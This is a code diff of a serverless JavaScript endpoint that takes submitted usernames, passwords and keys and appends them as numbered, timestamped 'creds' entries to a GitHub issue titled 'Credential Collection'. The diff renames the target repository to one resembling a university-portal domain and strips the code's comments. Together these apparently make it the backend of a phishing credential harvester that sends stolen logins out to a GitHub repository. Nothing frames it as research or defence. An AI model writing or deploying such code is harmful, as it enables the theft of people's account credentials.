@@ -1,23 +1,23 @@
-// api/update-issue.js
+
 const axios = require('axios');
 module.exports = async (req, res) => {
-  // Enable CORS
+  
   res.setHeader('Access-Control-Allow-Credentials', true);
   res.setHeader('Access-Control-Allow-Origin', '*');
   res.setHeader('Access-Control-Allow-Methods', 'GET,OPTIONS,POST');
   res.setHeader('Access-Control-Allow-Headers', 'X-CSRF-Token, X-Requested-With, Accept, Accept-Version, Content-Length, Content-MD5, Content-Type, Date, X-Api-Version');
-  // Handle OPTIONS request (pre-flight)
+
   if (req.method === 'OPTIONS') {
     return res.status(200).end();
   }
   
-  // Make sure this is a POST request
+  
   if (req.method !== 'POST') {
     return res.status(405).json({ error: 'Method not allowed' });
   }
   
   try {
-    // Access the GitHub token from environment variables
+   
     const githubToken = process.env.GITHUB_TOKEN;
     
     if (!githubToken) {
@@ -27,12 +27,12 @@ module.exports = async (req, res) => {
     
     const { username, password, key } = req.body;
     
-    // Your GitHub repository information
-    const owner = 'ZA3MA3'; // Replace with your GitHub username
-    const repo = 'progres'; // Replace with your repository name
+   
+    const owner = 'ZA3MA3'; 
+    const repo = 'progres.mesrs.dz'; 
     const issueTitle = "Credential Collection";
     
-    // First, check if the issue already exists
+    
     const issuesResponse = await axios.get(
       `https://api.github.com/repos/${owner}/${repo}/issues`,
       {
@@ -47,15 +47,14 @@ module.exports = async (req, res) => {
       }
     );
     
-    // Look for our specific issue
+    
     let existingIssue = issuesResponse.data.find(issue => issue.title === issueTitle);
     let response;
     
     if (existingIssue) {
-      // Get current time for timestamp
+    
       const timestamp = new Date().toISOString();
       
-      // Get the existing issue to see the current body content
       const issueDetailsResponse = await axios.get(
         `https://api.github.com/repos/${owner}/${repo}/issues/${existingIssue.number}`,
         {
@@ -68,21 +67,21 @@ module.exports = async (req, res) => {
       
       const currentBody = issueDetailsResponse.data.body;
       
-      // Count existing credential sets to determine the next ID
+ 
       const credRegex = /creds(\d+):/g;
       let matches = [...currentBody.matchAll(credRegex)];
       let nextCredId = 1;
       
       if (matches.length > 0) {
-        // Find the highest existing ID and increment by 1
+        
         const highestId = Math.max(...matches.map(match => parseInt(match[1])));
         nextCredId = highestId + 1;
       }
       
-      // Format the new credentials with an ID
+      
       const newEntry = `\n\n## creds${nextCredId}: ${timestamp}\nUsername: ${username}\nPassword: ${password}\nKey: ${key}`;
       
-      // Update the existing issue with the new credentials appended
+     
       response = await axios.patch(
         `https://api.github.com/repos/${owner}/${repo}/issues/${existingIssue.number}`,
         {
@@ -98,7 +97,7 @@ module.exports = async (req, res) => {
       );
       
     } else {
-      // Create a new issue if none exists
+      
       response = await axios.post(
         `https://api.github.com/repos/${owner}/${repo}/issues`,
         {
